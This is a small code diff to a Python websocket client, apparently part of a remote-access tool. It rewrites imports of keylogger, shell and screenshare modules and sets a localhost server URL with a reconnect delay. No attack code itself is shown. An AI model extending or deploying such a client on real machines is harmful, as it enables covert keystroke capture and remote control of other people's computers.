@@ -5,10 +5,10 @@ import threading
 import websocket
 
 import util
-import keylogger
+from keylogger import keylogger
 import classes
-import shell
-import screenshare
+from shell import shell
+from screenshare import screenshare
 
 SERVER_URL = "ws://localhost:8080/ws/seeker"
 RECONNECT_DELAY = 5
